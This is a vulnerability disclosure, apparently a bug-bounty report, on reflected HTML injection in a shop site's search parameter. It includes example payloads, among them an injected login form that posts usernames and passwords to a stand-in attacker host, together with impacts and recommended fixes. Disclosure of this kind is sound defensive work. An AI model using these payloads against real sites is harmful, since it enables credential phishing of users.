## Title

HTML Injection via search Parameter on home Page

## Vulnerability Type

HTML Injection

## Summary

Shop Zone https://admin-catalog.kzlabs.in/ search parameter is vulnerable to HTML injection.
The website reflects user input from the search parameter without proper sanitisation/encoding, which allows an attacker to inject arbitrary HTML markup that is rendered in the victim's browser when the victim visits a malicious URL. This can be used to alter page content, inject fake forms, or redirect/deceive users (e.g. phishing).

## Vulnerable Endpoint

https://admin-catalog.kzlabs.in/

## Steps to Reproduce

1. Navigate to the following URL: `https://admin-catalog.kzlabs.in/`
2. Observe that the injected HTML is rendered on the page (e.g. injected heading, image, or form appears where the input is reflected)

## Payload used

`<h1 style="color:red">HACKED</h1>`

(Other useful payloads to demonstrate impact: `<img src=x>`, `<iframe src="https://evil.example"></iframe>`, `<form action="https://evil.example/capture"><input name="username"><input type="password" name="password"><input type="submit"></form>`)

## Proof of Concept Request

`Screenshot 1: Screenshot shows payload in vulnerable search parameter`

<img width="1460" height="559" alt="image" src="https://github.com/user-attachments/assets/0add7d44-2c93-48d0-97c2-e5391d7cbbc1" />


`Screenshot 2: Screenshot shows the injected HTML rendered on the page`

<img width="1792" height="1090" alt="image" src="https://github.com/user-attachments/assets/bf774db4-acc1-4800-aa5d-a94de9e8c7c1" />


## Impact

An attacker can perform the following actions using this vulnerability:

- It allows attackers to alter the visual appearance and content of the page
- It can be used to inject fake login forms to phish user credentials
- It can be used to embed malicious or misleading links/iframes
- It can damage the credibility/trust of the application in the eyes of the victim
- Depending on context, it may act as a stepping stone toward stored/reflected XSS if input filtering is inconsistent

## Recommendations for fix

Validate and sanitise the [parameter name] parameter to ensure it does not contain any malicious HTML content. This can be done by:

1. Encode all user-controlled output before rendering it in HTML context (e.g. use `htmlspecialchars()` in PHP, or an equivalent output-encoding function in the relevant language/framework)
2. Apply a strict allow-list for any HTML tags/attributes that are genuinely required (e.g. via a sanitisation library such as DOMPurify), rather than a deny-list
3. Set a strong Content-Security-Policy (CSP) header to reduce the impact of any injected markup
4. Avoid directly concatenating user input into HTML templates; use templating engines with automatic contextual escaping
5. Use a WAF (e.g. Cloudflare) as a defence-in-depth measure to catch common injection payloads before they reach the server
